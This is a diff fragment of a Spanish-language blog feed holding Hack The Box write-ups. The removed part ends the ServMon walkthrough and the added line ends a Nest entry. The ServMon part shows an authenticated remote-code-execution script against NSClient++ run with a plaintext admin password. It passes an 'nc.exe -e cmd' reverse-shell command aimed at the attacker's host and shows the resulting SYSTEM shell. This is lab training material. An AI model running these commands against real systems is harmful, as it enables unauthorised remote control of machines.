-usage: NSClient++ 0.5.2.35 Authenticated RCE &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;target]] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;port]] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;password]] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;
-
-optional arguments:
-  &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;     show this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;message and &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;target]    Target IP Address.
-  &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;port]      Target Port.
-  &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;password]  NSClient++ Administrative Password.
-  &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;   Command to execute on target
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora, como nos solicita la contraseña; es posible que el script se loguee en el servidor; por lo tanto necesitamos tener nuestro &lt;strong&gt;Local Port Forwarding&lt;/strong&gt; y con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c&lt;/code&gt; nos dice que recibe comandos para ejecutar a nivel de sistema; esto indica que podríamos subir nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; a cualquier ruta donde tengamos permisos y con el exploit llamarlo para entablarnos una reverse shell.&lt;/p&gt;
-
-&lt;p&gt;En este caso ya tenemos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Temp&lt;/code&gt;, así que nos ponemos en escucha por el puerto 443 y ejecutamos el exploit:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 nsclient.py &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 8443 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ew2x6SsGTxjRwXOT&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe -e cmd 10.10.14.27 443&quot;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Targeting base URL https://127.0.0.1:8443
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Obtaining Authentication Token &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Enabling External Scripts Module &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Configuring Script with Specified Payload &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Added External Script &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name: xdozKLVGdAG&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Saving Configuration &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Reloading Application &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Application to reload &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Obtaining Authentication Token &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Triggering payload, should execute shortly &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Timeout exceeded. Assuming your payload executed &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.184] 50275
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.18363.752]
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2019 Microsoft Corporation. All rights reserved.
-
-&lt;span class=&quot;nb&quot;&gt;whoami
-whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-
-C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;SClient++&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ya obtenemos acceso a la máquina como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Powershell" /><category term="API_Fuzzing" /><category term="Web" /><summary type="html">Resolución de la máquina ServMon en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somos el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="VBA" /><category term="File_Misconfiguration" /><category term="Cryptography" /><summary type="html">Resolución de la máquina Nest en la plataforma de Hack The Box</summary></entry></feed>
